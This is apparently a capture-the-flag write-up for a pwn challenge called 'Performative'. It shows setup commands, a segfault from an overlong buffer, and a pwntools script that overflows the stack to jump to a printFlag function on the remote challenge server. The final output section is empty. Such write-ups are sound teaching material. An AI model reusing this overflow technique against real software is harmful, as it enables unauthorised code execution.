# Performative

Description: 
To build and start.
First `cd` into the `src` directory. Then run:
```bash
docker-compose up --build -d
```
Connect to the challenge with:
```
nc localhost 1337
```
After solving locally, connect to the challenge with:
```
nc performative.nitephase.live 56743
```                                                      


#### Local Solve: 
On starting the challenge, this is what I had to work with:  
```
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Generating your buffer...

Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    165023 segmentation fault (core dumped)  ./perf
```


script.py
```python
from pwn import * 

binary_file = './perf'

elf = ELF(binary_file)
p = remote('performative.nitephase.live', 56743)

offset = 40 
print(p.recvline())

address_of_printflag = elf.symbols['printFlag']


payload = [b'A'*offset, p64(address_of_printflag)]

p.sendline(b''.join(payload))
p.recvuntil(b':')


for i in range(6): 
    print(p.recvline())

p.close()
```

Output: 
```
